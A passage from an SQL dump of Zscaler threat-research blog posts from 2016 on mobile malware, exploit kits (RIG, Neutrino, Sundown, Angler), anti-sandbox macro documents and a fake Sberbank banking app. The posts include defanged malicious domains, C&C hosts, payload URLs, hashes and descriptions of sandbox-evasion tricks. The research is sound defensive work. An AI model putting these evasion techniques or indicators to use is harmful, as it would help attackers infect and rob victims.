the user clicks the first button.    Following is the function responsible for sending SMS to premium numbers:        Send SMS code routine        SMS    The downloaded application is also found to be a fake app and crashes in all the lab devices. Seeing that, the victim will probably try to open the malicious app multiple times triggering malicious routine each time which includes sending message to premium numbers costing the victim more money.    Pokémon GO Clickfraud    As we saw in the above case, the fake app is capable of scamming gamers financially by sending SMS messages to premium numbers. However, it is important to note that this fake application never made it to Google PlayStore. However, we did see an aggressive auto-clicker malware variant leveraging Pokémon GO lure making its way to Google\'s PlayStore. The app was named \"Install Pokémon GO,\" which got our attention with a huge number of negative reviews and comments from more than 2500+ users. Google was quick to remove this app.The screenshot below shows the icon of installed app:           AutoClicker using Pokémon GO Icon    The app disguised itself as a guide to installing Pokémon GO from third party store ApkMirror, but in reality it was doing nothing more than displaying a banner for few seconds and started its aggressive auto clickers.      The screenshot below shows the screen displayed to victim for few seconds regarding how to install Pokémon GO.      Installation Banner    After few seconds it starts displaying ads on main screen as shown in screenshot above.  Additionally, the app launches the browser, opens several links automatically, and starts auto clicking activity.    The screenshot below shows several links opened within a very short span of time. It also shows the type of ads loaded by the auto clicker app:        Auto clicked links and displayed Ads    The damage that such apps can inflict is less severe when compared to banking Trojans or Ransomware, but since it leaks victim\'s sensitive information like device info, SIM details, timezones and location it may serve as a gateway for further attacks and infection.    Pokémon GO Privacy issue    The original Pokémon GO application has also gone through scrutiny surrounding privacy issues because of overly aggressive access permissions than it requires.  iOS version of the Pokémon GO originally required full access to user’s Google account when the user signs on via Google account. Such an approval grants all access of user’s Google account to the game. Considering the personal and the financial information stored over Google accounts, such access of the data to third-party servers will create a serious issue in case of data theft on Pokémon GO servers.    Meanwhile Niantic, Inc (Developer of the Pokémon GO) published a statement saying that this happened due to coding errors and they have fixed it, as the game needs only player’s Gmail account and user ID. The company also promised that none of the unwanted user data has been accessed yet.     Don’t let the malware authors exploit this temptation of playing Pokémon GO. As of now Niantic, Inc has fixed the privacy related issues in new Pokémon GO app. We recommend downloading game from authorized and legit sources only.     Have a happy and safe gaming.     Writeup by - Viral Gandhi, Shivang Desai', 'Mobile Malware', 'https://www.zscaler.com/blogs/research/pokemon-go-pikachu-thunder-shocks-users-wallet-and-personal-life');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (96, 'Apple Patches Persistent Cookie Vulnerability Discovered by Zscaler', 'Abhinav Bansal', 'July 18, 2016', 'Cookies are a fundamental part of our everyday web access.  We take them for granted and freely give websites access to relevant “cookies” in our browsers because they dramatically enhance our user experience. Cookies are considered “persistent” if they last beyond a single browser session. Persistent cookies remain in your browser until you explicitly erase them or your browser deletes them after a given duration (set by the site using the cookie).\r\n\r\nTypical examples of websites that use persistent cookies are your favorite webmail sites like Gmail and Yahoo!. They use use persistent cookies to remember you, so you don’t have to log in every time you go to get your email.\r\n\r\nDescription of Vulnerability in Apple OSX and its Potential Impact\r\n\r\nZscaler discovered a vulnerability in Apple’s recent OS X version (El Capitan), which enabled applications that did not have the appropriate privileges to access cookies stored in the Safari browser. This access could result in a malicious application lifting all the persistent cookies for a given user and accessing sites posing as that user. In the case of email (like those of the sites mentioned above), it could result in a malicious application getting access to all your email.  Worse, it could gain access to a site that stores more personal and confidential information about you.\r\n\r\nApple Releases Patch to Fix Vulnerability\r\n\r\nToday, Apple released a new update to El Capitan v10.11.6 with Security Update 2016-004 that addresses this vulnerability.  More details of the release are here.\r\n\r\nAdditional Information on Persistent Cookies\r\n\r\nThe use of persistent cookies is growing steadily.  As of July 2016, 23.6 percent of all websites use persistent cookies. While 38.6 percent of these sites use cookies that expire in hours, more than 60 percent of sites use cookies that expire in days or months.\r\n\r\n \r\n\r\nSome popular sites using persistent cookies include the following:\r\n\r\n\r\n	Youtube.com\r\n	Baidu.com\r\n	Wikipedia.org\r\n	Amazon.com\r\n	Google.co.in\r\n	Twitter.com\r\n	Msn.com\r\n	Google.co.jp\r\n	Yahoo.co.jp\r\n	Linkedin.com\r\n\r\n\r\nMore information on websites using persistent cookies can be found at w3techs.com.\r\n\r\nStay up to date on the latest threats and trends by reading posts from the Zscaler Research Team’s blog.', 'Apple', 'https://www.zscaler.com/blogs/research/apple-patches-persistent-cookie-vulnerability-discovered-zscaler');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (97, 'Zika isn\'t the Only Thing You Need to Worry About During the Rio Olympics', 'Chris Mannon', 'July 15, 2016', 'In just a few weeks, thousands of athletes and fans from around the world will gather in Rio de Janeiro for one of the world\'s most widely anticipated international sporting events, the Olympics. However, as one of the most popular events, the Olympics also entices cyber criminals and scamsters to take advantage of unsuspecting users who might be searching for related news, the event schedule, online streams, or even the Zika virus impact.\r\n\r\nAt ThreatLabZ, we are always on the lookout for threats taking advantage of major world news and events, and recently found some examples of exploit kit traffic coming from Olympics-related content. As is usually the case, these websites are compromised to redirect users to exploit kits and ultimately infect unwary visitors with a variety of payloads. In the cases we present here, we have seen RIG Exploit Kit dropping Qakbot as well as Neutrino Exploit Kit dropping CryptXXX.\r\n\r\nCase 1: The first case begins with a user looking to make an Olympic themed cake, and getting served with the RIG Exploit Kit.\r\n\r\n\r\n\r\nThe compromised site contains a malicious inject hidden in the jquery.js file that redirects the user to a gate. This gate redirects the user to the RIG landing page, which loads a malicious SWF.\r\n\r\nFollowing exploitation, a payload encrypted with a simple XOR cipher is downloaded onto the victim’s system. The malware in question is the infamous worm, Qakbot. In addition to attempting to spread itself across network shares, Qakbot can allow remote access to the user’s system, steal information from the victim\'s machine and exfiltration to the attacker’s remote server, among other functions.\r\n\r\n\r\n\r\nThe threat installs itself as a service named \"Remote Procedure Call (RPC) Service\" to mask its presence and ensure persistence.\r\n\r\nCase 2: Our second case involves the compromised South Africa Gymnastic Federation website, which is leading users to Neutrino Exploit Kit via an injected script.\r\n\r\nWhen examining the website\'s code, we can see the Flash object for the EITest redirector embedded towards the bottom of the page.\r\n\r\n\r\n\r\nFollowing the EITest gate is a Neutrino landing page and SWF payload. Upon successful exploit run, the ransomware CryptXXX is delivered to the victim\'s machine.\r\n\r\n\r\n \r\n\r\nBefore actually encrypting users\' data, CryptXXX attempts to delete shadow copies of system files to prevent recovery.\r\n\r\n\r\n\r\nBelow is the Neutrino EK Activity seen in last 30 days\r\n\r\n\r\n\r\nConclusion\r\n\r\nWe’ve reported on previous cases where compromised sites can cause ransomware infections or worse, and this continues to be true with the examples covered today. Users should always make sure that Adobe Flash Players Auto-Update feature is enabled, and it is highly recommended to leverage click-to-play functionality in web browsers. These steps can greatly reduce users\' exposure to vulnerabilities. As we get closer to the event, we expect to see a rise in threats and scams leveraging Olympics topics to target a large number of victims. \r\n\r\nZscaler\'s standard security checklist - Olympics Edition:\r\n\r\n\r\n	Inspect the source of emails with enticing shopping deals. Be wary of any suspicious attachments\r\n	Steer clear of unofficial mobile application stores\r\n	Check the authenticity of the URL or website address before clicking on a link\r\n	Stay away from e-mailed invoices - this is often a social engineering technique used by cyber criminals\r\n	Use two-factor authentication whenever possible especially on sensitive accounts such as those used for banking\r\n	Always ensure that your operating system and web browser have the latest security patches installed\r\n	Use browser add-ons like Adblock Plus to block popups and potential malvertisements\r\n	Backup your documents and media files - this is extremely important with the surge in ransomware infections\r\n	For health safety guidelines, please review the Centers for Disease Control & Prevention notice.\r\n\r\n\r\nWriteup by - Chris Mannon, Rubin Azad', 'Abuse;Compromise;Exploit;Exploit Kit;Malware;Scam', 'https://www.zscaler.com/blogs/research/zika-isnt-only-thing-you-need-worry-about-during-rio-olympics');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (98, 'Sundown Chronicles - Observations of an Exploit Kit\'s Evolution', 'Ed Miles', 'July 07, 2016', 'Since the apparent deaths of the Angler and Nuclear exploit kits, we have seen elevated activity from other groups. While RIG and Neutrino have been the primary actors in the void left by Angler and Nuclear, Sundown has also been active and making strides to increase its share of the exploit kit marketplace. We previously analyzed Sundown in January, and while it remains a significantly less sophisticated kit than other EKs, its developers are quickly working to develop the kit\'s capabilities. Recently, we have seen a flurry of iterative improvements in the exploit kit, similar to the behavior seen during our observation in January.    In this analysis, we will not detail the components of the Sundown EK since we covered that in our previous post, but will highlight the most interesting observations over the past month. See here for additional insight on Sundown\'s structure through June 30th.         2016-06-15    In the Sundown PCAP released on 2016-06-15, the landing page was a mish-mash of styles, including a section that appears ripped directly from RIG landing pages seen around April-May. This section actually caused some confusion as we saw detections for this version of the landing page mistakenly labeled RIG.               Fig 1 - Stolen RIG Code           Besides the stolen RIG code, the Sundown landing page featured a base64-encoded block to exploit Flash (though the Flash version detection code and trigger are unencoded), a second and larger base64-encoded block to exploit Flash (without external trigger code), an interesting VBScript payload that attempts to launch an additional script via wscript.exe, and a very lightly encoded VBScript payload for the GodMode vulnerability, wrapped in a JavaScript block.             Fig 2 - VBScript wrapped in JavaScript             2016-06-27    While reviewing Sundown activity, we found that the campaign was still active but the landing page structure changed enough to evade our previous signatures. At this point, Sundown had abandoned the RIG-ripoff tactic, and stuffed nearly everything into base64-encoded blocks with an overabundance of <body> tags.             Fig 3 - New Sundown landing page on the left, old page on the right           For some reason, a completely unencoded Flash object remained on the landing page, which included a nice shellcode payload in a FlashVar named \'exec\'! The shellcode is fairly basic, using urlmon.dll to fetch a malware payload.             Fig 4 - Shellcode downloads a malware payload from the highlighted URL         2016-06-30    Close monitoring continued and although there weren\'t any notable changes to the landing page, we did some testing with an old VM that produced an interesting result. We did further testing and found that user-agents claiming to be Internet Explorer 6 caused a basic PHP backend to be dumped to the browser. This uncovered backend shows the construction of some static objects to serve on the landing page and a switch statement based on the results of a simple, but flawed, IE version check. The IE check causes the backend to select between two different payloads.           Fig 5 - PHP backend code dumped in the landing page response           2016-07-01    Going into the long weekend for our US office, we wanted to keep a close eye on Sundown, and noticed a few new changes. First off, the landing page structure changed, with a major inflation in code size. The landing page makes multiple uses of the JavaScript string replace function to translate the inflated landing page data back to percent escaped values to be decoded with the unescape function.           Fig 7 - String replace calls replace strings with digits           Besides the landing page inflation, we also began seeing delivery of a RAT known as NetWire or NetWiredRC. Identification was easy thanks to the thorough analysis and documentation by CIRCL, MalwareMustDie, and others.             Fig 8 - Multiple strings related to data theft from various sources           However, this seems to be a slightly updated version of NetWire. It\'s previously been pointed out that the RAT uses a 76-way switch statement for parsing commands from the server, while the sample Sundown delivered provided for 82 cases.             Fig 9 - IDA graph of the command parsing switch logic           The RAT was configured to communicate with 86t7b9br9.ddns[.]net (resolving to 62.210.14[.]117) on port 8980, but the server was rejecting connections at the time of analysis.           Fig 10 - C&C hostname resolves but rejects connection attempts        2016-07-05    On checking Sundown again, we found some small changes compared to the landing page seen on July 1st. The same inflationary tactics are used on the landing page but the landing page comes in a few hundred kilobytes smaller, thanks in small part to stripping of many CRLFs from the HTML.             Fig 11 - Sundown\'s landing page starts looking squashed without CRLFs           We noticed a very interesting change to the payload at this point: the exploit kit was actually delivering unmodified copies of PuTTY version 0.66. Visit infected website, receive PuTTY! We considered this could actually be useful if it wasn\'t likely to be a simple test payload.             Fig 12 - PuTTY is the new calc?             With no interesting payload to investigate, we decided to do some poking at the infrastructure. We went looking for the backend admin panel, but instead we found a nice splash page. When browsing the landing page URL with no parameter, a simple HTML page with a meta tag meant to load another HTML page from a base64 encoded data tag.            Fig 13 - The meta tag of the matryoshka splash page           It turned out that the HTML didn\'t actually load properly (it appears the meta refresh directive doesn\'t work in this case), but since the actual splash page was contained in the previously mentioned data parameter, we decoded the base64 blob. This turned out to be another HTML page, this time with data:image objects for background and foreground images, with the foreground image showing a logo for a \"Yugoslavian Business Network\".             Fig 14 - Is Sundown really the work of the YBN?           This Russian Business Network inspired group may or may not be responsible for Sundown, but there does appear to be a German language group offering coding services on forums under the YBN moniker, with many commenters voicing their pleasure with the services.           Fig 15 - Everyone loves a good logo, whether its the white-hat infosec industry or an underground black-hat forum           2016-07-06    Checking on Sundown again, we found yet more changes to the landing page. This time, the changes to the landing page itself mostly comprised small structural changes, but the functionality of the encoded blocks was altered in an interesting way. Rather than being a self-contained landing page, additional javascript payloads would be fetched from the server. Both the landing page and the secondary payloads used the same encoding/inflation technique mentioned above. Where the previous single-file landing pages were initially between 20k and 100k, then multiple megabytes, we began seeing primary landing pages of 12k supported by javascript payloads in several different sizes: approximately 300kB, 1.5mB, and 4mB.           Fig 16 - The landing page itself has shrunk, but now there are huge secondary JavaScript payloads           In addition to the newly modularized landing page, we also discovered that Sundown\'s PuTTY service was shutdown to make way for actual malware delivery once again, with NetWire returning to the party.         2016-07-07    We found a new malware payload: a version of Kasidet that adds a base64-encoding layer to its HTTP callbacks. This is new behavior compared with our previous analysis, where we reported it being dropped by malicious spam. Callbacks were attempted to hhggffppgttt[.]ru (resolving to 185.127.25.173 at the time of analysis), including the submission of a screenshot. Cleverly, the C&C server response with 404 status codes, but the 404 pages contained base64-encoded responses inside HTML comments.           Fig 17 - Kasidet commands and responses are easily decoded                Conclusion    Since the disappearance of the two top exploit kits, Angler and Nuclear, other kits will be fighting for market share. Sundown remains technically less sophisticated than others, but as we outlined in this analysis, Sundown\'s authors will surely keep making rapid updates to their code. Zscaler ThreatLabZ will continue monitoring the situation to ensure protection of Zscaler customers and provide relevant updates.         IOCs    Exploit Payloads      	E785F04EA98CBF3E42C46417E7DD7925  	226EE49F76023A29DD40D25675C37743  	9A9FFCE2F4462C2751FA5D76E180979C           EXE Payloads      	3bb6eba8ea26a293a238ba98a6731238  	78df54a2465fcd2c01fa14ab72d8cdfb  	bcb80b5925ead246729ca423b7dfb635  	af8b13866833c76b93a0d7b114c2671d  	33C9D1E56152E212367E9C5B01671E45  	AF8B13866833C76B93A0D7B114C2671D        Domains seen during analysis      	ewfihwfehiiwfhowfowfwfwfihfwhwffjwfjbfwjbkfw[.]xyz  	fdijgdlkfjgkldfjkldfjklgfjkldfjkldfjkldfgjkl[.]xyz  	djfnuihueifbnjosnfeurgbjorbjhucibyuc3dmxicnu[.]xyz  	dashpsadfoihpidfasdkiga[.]xyz  	dsafhpadfsihadfiph[.]xyz  	afihpiahfpiaefhpiadkiga[.]xyz  	afihaspifhpiasdhpidkiga[.]xyz  	doishdjsdjbsdgfiysgdfiysgdfigsdigfisdgfsgfig[.]xyz  	djfnuihueifbnjosnfeurgbjorbjhucibyuc3dmxicnu[.]xyz  	efiugfhifuwgyfjdhgyjgyfcfxhfghchgjgugkhdijos[.]xyz  	sdahsadpihsdafpihfdkigasdj[.]xyz  	sgerpijhsger0pihgsdkigasdj[.]xyz  	afsidhipafshfapsihdkiga[.]xyz  	fdshdiufsbuibnjosdnvjobsdbiyhvsbibdnjvosfnos[.]xyz  	ouaefgoiafehoafeughoaufeoiuafseghgouaesf[.]faith  	sdahsadpihsdafpihf[.]xyz           IP addresses hosting Sundown domains      	185.93.185[.]226 (Check VirusTotal for more Sundown domains seen on this IP)  	185.93.185[.]230 (Check VirusTotal for more Sundown domains seen on this IP)', '', 'https://www.zscaler.com/blogs/research/sundown-chronicles-observations-exploit-kits-evolution');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (99, 'Top Exploit Kit Activity Roundup', 'Derek Gooley', 'June 24, 2016', 'Overview    The majority of malware and other computer security threats are delivered through web browsing. Exploit kits are rapidly deployable software packages designed to leverage vulnerabilities in web browsers to deliver a malicious payload to a victim’s computer. Authors of exploit kits offer their services for sale, distributing malware for other malicious actors. The intent of this paper is to highlight the recent activity in three of the most active exploit kits: Angler, RIG, and Neutrino.    Angler Exploit Kit    About Angler    Since appearing in 2013, Angler has continued to be responsible for a significant number of exploit kit infections. However, all Angler activity has dropped off since the second week of June 2016, causing many security researchers to suspect the end of this exploit kit. Angler is known for its frequently changing obfuscation methods that help it avoid detection.    Activity    Angler activity has remained fairly consistent through the spring of 2016. Active malvertising and compromised site campaigns remain active, with several new landing page formats introduced to evade detection. The long-running EITest campaign, up since 2014, and Darkleech campaign remain active.        Figure 1: Angler hits, April - May 2016    We saw 6,500 blocked Angler session in April through mid-May, 2016. Graph activity, as usual with exploit kits, matches western work-week browsing traffic, with significantly less hits on Saturdays and Sundays.        Figure 2: Blocked Angler Heatmap    As is common, the majority of Angler activity is seen in the United States. Western European countries also saw a relatively large number of Angler hits.    In mid-June 2016, Angler activity quickly dropped to a fraction of what was observed through the previous months. Many EITest campaign gates that were previously serving Angler are now only serving Neutrino or Sundown exploit kit landing pages. The decline in Angler activity has also resulted in a drop in CryptXXX infections, as Angler was a major source of distribution for that ransomware family.        Figure 3: Drop in Angler gates redirect activity in June 2016    Execution    At the beginning of April 2016, we observed a new variant of Angler landing page that leveraged a different form of obfuscation to evade detection. Angler activity throughout most of April and May remained consistent with these new patterns. The Angler domain associated with this campaign was also serving two separate landing pages with different JavaScript obfuscation techniques.        FIgure 4: Two landing pages served by the same Angler host    Angler is known to check for antivirus, analysis tools and sandbox product artifacts during the exploit cycle. If any DLLs or other artifacts from a list of AV engines are detected on the system, the exploit cycle is aborted and no malware payload is dropped.        Figure 5: AV and security product artifacts check    Angler primarily exploited vulnerabilities in Flash and Silverlight. Observed in April were Flash payloads using CVE-2016-1019, which affected Flash versions earlier than 21.0.0.182, and was actively targeting 20.0.0.306. We also saw campaigns targeting Silverlight 4.0.50524.0.    Malware Delivery    TeslaCrypt remained a common malware payload throughout April. Through early May, more recent Angler activity was seen dropping Bedep (a click-fraud bot and second-stage downloader) and CryptXXX in place of TeslaCrypt.         RIG Exploit Kit    About RIG    RIG exploit kit was discovered in 2014 and has targeted vulnerabilities in Java, Flash, and Silverlight. Attention was drawn to RIG in early 2015 when the source code for the exploit kit was leaked. After the leak, no major changes have been made to RIG’s architecture, yet RIG continues to be a popular exploit kit.    Activity    RIG continues to use the same URI scheme for its landing page resources and payload downloads. The majority of exploit cycles we have observed through April and May have come through the “topgunn” gate, which remains a major source of RIG EK infections.    In early June, some RIG campaigns began using a new format for its landing page domains, ditching the typical 2-character subdomain, as well as leveraging dynamic DNS providers.        Figure 6: New RIG landing page domains and dynamic DNS    Also recently observed was a change in the gate redirection flow for some exploit cycles. Compromised sites would first redirect to a .html document, then to a .phtml document (an uncommon filetype for PHP) with the same file name, and finally to the landing page.        Figure 7: RIG EK hits, April - May 2016    The end of April saw a decrease in RIG activity, but the number of infections have since increased through May and into June.        Figure 8: RIG landing page heatmap    The majority of landing pages we have observed are hosted in the United States.    Execution    The “Quad Power” gate activity, as described in our February 2016 blog has continued throughout April and May. The Quad Power gate uses .win, .top, .party, and .bid TLDs with the same second-level domain to serve landing pages.        Figure 9: Example RIG compromised site IFrame injection        Figure 10: Example RIG landing page    Malware Delivery    Earlier in 2016 RIG was observed to be dropping Tofsee backdoor as part of it\'s exploit cycle. RIG has also been recently observed dropping new Zeus payloads.    Malware Traffic Analysis has recently reported on several examples of RIG dropping Tofsee payloads. These findings are in line with the campaign we have observed since Fall 2015.    In early April we observed a malvertising campaign coming from the “Whoads” advertising service. This cycle led to RIG landing pages through an HTTPS connect and two levels of gates, and ultimately dropping Qbot as its final payload. This campaign is directly related to the overall rise in Qbot activity, as reported by BAE Systems and Kaspersky Threatpost.         Neutrino Exploit Kit    About Neutrino    Neutrino has a fairly simple architecture and doesn’t boast some of the more robust obfuscation and anti-sandboxing techniques as other exploit kits, yet it remains popular. Since the recent decline in Angler activity, Neutrino hits have spiked to fill the void. Neutrino is also commonly associated with various malvertising campaigns.    Activity    Neutrino is generally less active than RIG and Angler, but has been fairly constant since fall of 2015. Several new landing page hosts are set up each week, for both malvertising and compromised host campaigns. The EITest gate campaign, typically used for serving Angler, has also been seen serving Neutrino landing pages. Since Angler activity dropped off, EITest gates have been delivering Neutrino landing pages on most occassions.    The majority of campaigns we have observed in spring of 2016 used .top TLD domains for their landing pages and have targeted Adobe Flash Player. We have seen Neutrino landing pages dropping a variety of malware payloads, including Tofsee, Gamarue/Andromeda, Panda Banker, and various ransomware.        Figure 11: Neutrino hits, April - May 2016        Figure 12: Neutrino landing page heatmap    The majority of recent Neutrino hosts have been observed in the US, Italy, and Romania.    Execution    The Neutrino footprint on compromised sites is very small, typically just an IFrame tag at the very beginning of the page body content. Aside from the EITest campaign, gates are rarely used in Neutrino campaigns.        Figure 13: Compromised site IFrame injection    Neutrino landing pages lack the complex JavaScript obfuscation of Angler and other more advanced exploit kits. All landing pages we have observed this spring have used a similar format, with little more than a Flash Player object that loads a SWF exploit.    A SANS whitepaper published in April by Luis Rocha contains a detailed analysis of Neutrino architecture.        Figure 14: Neutrino landing page    Neutrino pages served through malvertising campaigns observed in April and May are also simply constructed. Malicious pages typically consist solely of an IFrame redirect to the landing page and sometimes a second IFrame to load actual advertising content.    Malware Delivery    In mid-May we observed a full exploit cycle from a malvertising campaign that ultimately dropped a Gamarue trojan payload. The page served by the advertising service contained an IFrame to load casino-themed advertising content and an IFrame that loaded an intermediate page from the same host to help mask the exploit kit presence. The intermediate page contained redirect to the Neutrino landing page. This campaign is further described in our recent blog.        FIgure 15: Malvertising campaign using intermediate page         Conclusion    Exploit kits pose a significant threat to users during simple web browsing. In the case of ransomware infections, the result could be the inability of a user to access his or her files. The techniques exploit kit authors use to hide their activities are frequently changing, and security researchers work hard to analyze and block these new threats.    To help avoid infections such as these, users should always block untrusted third-party scripts and resources, and avoid clicking on suspicious advertisements. Zscaler’s ThreatLabZ has confirmed coverage for these top exploit kits and subsequent payloads, ensuring protection for organizations using Zscaler’s Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/top-exploit-kit-activity-roundup');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (100, 'Malicious Documents leveraging new Anti-VM & Anti-Sandbox techniques', 'Deepen Desai', 'June 07, 2016', 'Introduction\r\n\r\nZscaler ThreatLabZ recently came across a new wave of malicious documents evading automated analysis systems using a new technique. Malicious executables that leverage numerous techniques to detect the virtual environment and automated analysis systems are very common, but we are seeing an increasing trend of such techniques moving to the initial delivery vector (i.e. weaponized documents).\r\n\r\nIn this blog, we look at some of the anti-VM and anti-sandboxing techniques seen in the recent malicious documents including the newly added check of Microsoft Office RecentFiles count.\r\n\r\nWeaponized Documents & anti-VM tricks\r\n\r\nMalware authors leveraging documents with macros to download and install malware executable has been around for years; however, we are seeing a gradual evolution in these malicious documents making it harder for the security solutions to detect them proactively. ThreatLabZ has seen hundreds of new weaponized documents hit our sandbox on a regular basis:\r\n\r\n\r\n\r\nFigure 1: New unique malicious documents\r\n\r\nA macro is a piece of code, embedded inside Microsoft Office documents, written in a programming language known as Visual Basic for Applications (VBA). Microsoft Office\'s default security settings ensures that the macros are disabled by default; however, attackers are using clever social engineering tactics to lure the user into enabling the macros. Below are two recent examples:\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nFigure 2: Social engineering tactics to enable macro\r\n\r\nMalware authors are also making the macro code highly obfuscated and difficult to detect by signature based systems. In addition to highly obfuscated macros, malware authors are using multiple techniques in macros to detect the virtual environment and automated analysis systems as seen below:\r\n\r\nCheck #1 - Look for standard virtual environment strings\r\n\r\n\r\n\r\nFigure 3: Virtual environment strings check\r\n\r\nCheck #2 - Windows Management Instrumentation (WMI) interface to identify virtual environment & automated analysis systems\r\n\r\n\r\n\r\nFigure 4: WMI interface to detect virtual environment & sandboxes\r\n\r\nCheck #3 - Look for presence of known analysis tools on the system\r\n \r\n\r\n\r\n\r\nFigure 5: Check for malware analysis tools\r\n\r\nIf any of these anti-VM or anti-sandbox checks is positive then the VBA macro code execution terminates and the end malware payload does not get downloaded on the system shielding it from automated analysis and detection. Alternately, the malicious document will download and install a malware executable on the victim\'s system if all the anti-VM checks fail.\r\n\r\nWe have seen multiple malware families leveraging malicious documents as the initial delivery vector:\r\n\r\n\r\n	Ransomware Trojans (e.g. CryptoWall, Locky, Cerber)\r\n	Banking Trojans (e.g. Dridex)\r\n	Backdoor Trojans (e.g. Matsnu, Kasidet)\r\n	Infostealer Trojans (e.g. Fareit, VawTrak, Pony)\r\n\r\n\r\nNew anti-VM and anti-sandbox checks\r\n\r\nIn the last week of May, we started seeing a new wave of malicious documents leveraging two new techniques that prevents it from executing on many known sandbox solutions.\r\n\r\nNew Check #1 - Detect virtual environment via Office RecentFiles property\r\n\r\n\r\n\r\nFigure 6: Microsoft Office RecentFiles property check\r\n\r\nRecentFiles property returns a RecentFiles collection that represents the most recently accessed files. The macro code checks if the number of RecentFiles collection is less than a predefined threshold and terminates if true. Threshold value we have seen is 3 or higher.\r\n\r\nThe malware author makes an assumption here that most clean Virtual Environment snapshots will be taken after a fresh Microsoft Office install with probably one or two document files opened for testing the installation. Alternately, a standard user system with Office applications should have at least 3 or more recently accessed document files.\r\n\r\nNew Check #2 - Check for the external IP ownership\r\n\r\n\r\n\r\nFigure 7: Check for security vendors, cloud & hosting services\r\n\r\nHere the malware author is leveraging macro to get the external IP address of the victim\'s system by using the following maxmind GeoIP service API:\r\n\r\nhttps://www.maxmind.com/geoip/v2.1/city/me\r\n\r\nThis API asks for user credentials but we did not see any hardcoded credential information being sent by the malicious document. The malware author is setting the UserAgent and Referer headers for this request to get the response without any authentication. We are still verifying if this is by design or if this is an authentication bypass issue for the API that is being exploited.\r\n\r\n\r\n\r\nFigure 8: Maxmind API usage for external IP information\r\n\r\nThe response is then compared against a predetermined list of strings (Figure X) that includes multiple known security vendors & hosting services as well as generic strings to detect data centers, hosting services, cloud based security and hosting services ownership. The macro execution will terminate if maxmind\'s response for the external IP address matches any of these strings.\r\n\r\nUpon successful checks, these new set of malicious documents were found to be downloading and installing Win32/Matsnu.Q Trojan from following URLs:\r\n\r\n\r\n	arabtradenet[.]com/info/content.dat \r\n	naivak[.]com/image/office14.ppb\r\n\r\n\r\n \r\n\r\n\r\n\r\nFigure 9: Matsnu executable payload being downloaded\r\n\r\nWe also saw Nitol and Nymaim payloads subsequently being dropped by Matsnu Trojan.\r\n \r\nConclusion\r\n\r\nMalicious documents with highly obfuscated macros have become an increasingly popular vector among cyber criminals to deliver malware executable payloads. By adding newer anti-VM and anti-analysis techniques to the malicious documents itself, the attackers are protecting the end executable payloads from being downloaded and detected by the automated analysis systems.\r\n\r\nZscaler ThreatLabZ will continue to monitor and ensure coverage against the evolving malicious document threat as well as subsequent malware executable payloads.\r\n\r\nResearch by: Deepen Desai, Nirmal Singh, Tarun Dewan', 'Evasion/Stealth;Malware', 'https://www.zscaler.com/blogs/research/malicious-documents-leveraging-new-anti-vm-anti-sandbox-techniques');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (101, 'Android Banker malware goes social', 'Shivang Desai', 'May 30, 2016', 'During a regular hunt for malware, our researchers came across an interesting malicious Android app that portrayed itself as an online app for the reputable Russian bank Sberbank, which is the largest bank in Russia and Eastern Europe.    There have been various attempts made in past to attack Sberbank of Russia and due to the ubiquitous nature of mobile devices, malware developers have also tried targeting Sberbank customers on their mobile devices in past. Looking at the sample we recently saw from our malware feeds, it appears to be yet another attempt at targeting the bank users in a unique way.    Overview:     The malware disguise itself as an online banking app for Russia\'s largest bank, Sberbank. The malicious app\'s appearance was similar to that of the original app. It displays a similar login screen to the original app and steals user credentials as soon as the victim tries to authenticate. Once the credentials are acquired, the app presents the victim with a page stating technical fault and terminates. The malware asks for administrator privileges upon installation, which if permitted, can cause devastating effects to the victim\'s device.    It can also intercept SMS messages and incoming calls which could be a step to overcome OTP (One Time Password) solutions implemented by the bank. Additionaly, this malware also contains modules to target a few other reputed apps for credentials.    Technical Explanation:    The app portrays itself as Sberbank\'s online Android app and upon installation, asks for administrator rights, as can be seen in screenshot below:           	  		  			  			  			  		  		  			  			Fake app and it\'s permissions  			  		  	           Once activated, it displays a login screen similar to the original app and can easily lure victims to enter their bank credentials.    We tried to install the original Sberbank online Android app from Google\'s Play Store, but it was hard to identify the difference between the original and fake app. Please note that Sberbank online app found from Google\'s Play Store is not malicious. Screenshot below displays both apps on phone:           	  		  			  			  			  		  		  			  			Original vs Fake bank app  			  		  	           One of the unique features of this malware is to overlay itself on the original Sberbank online app.  Even if the victim tries to access the original app, the malware will forcefully present its own fake login screen to the victim. Once the user enters their login details, they are sent to Command & Control (C&C) server. Credentials being sent to C&C can be seen in screenshot below:         	  		  			  			  			  		  		  			  			Credentials sent to C&C  			  		  	           As soon as the malware\'s purpose of stealing credentials is fulfilled, it displays a screen apologizing for some technical fault and closes itself. The error screen looks like shown below:           	  		  			  			  			  		  		  			  			Error Page after login  			  		  	           But the malware does not stop here. It also registers a few services and broadcast receivers, which were designed to remain persistent.  Following are the main functionalities exhibited by this malware:      	Sending SMS messages,  	Intercepting SMS messages  	Calling functionality  	Call interception  	Targeting other reputed apps via overlay screens           Sending SMS messages:    The malware is designed to accept commands from the C&C server allowing the malware developer to send SMS messages from the infected device to any number. Following screenshot shows how the functionality is implemented:           	  		  			  			  			  		  		  			  			Sending SMS functionality  			  		  	           In the above code snippet, \'paramString1\' and \'paramString2\' were the phone number and text message sent by C&C server, respectively. The attacker has the power to send any message to any number.    SMS message interception:    The malware intercepted SMS messages, collected the SMS details in a file and starts an Android service responsible for sending the file to remote C&C server.    Following screenshot shows the logic implemented for this functionality:         	  		  			  			  			  		  		  			  			SMS interception code snippet  			  		  	           We also noticed that the C&C server responded with locations where the interecepted SMS details should be sent. Malware was designed to work over Android\'s webview component allowing it to extract JavaScript from the C&C server\'s response and act accordingly.      Screenshot below shows the location received from C&C server:      	  		  			  			  			  		  		  			  			Location for sending SMS details  			  		  	           Screenshot below shows the SMS details sent to remote C&C server.      	  		  			  			  			  		  		  			  			SMS details in HTTP request  			  		  	           Calling functionality:    This malware is also capable of calling any number that the attacker wanted. This could cost the victim depending on the number of calls and the type of calls (premium numbers, international, 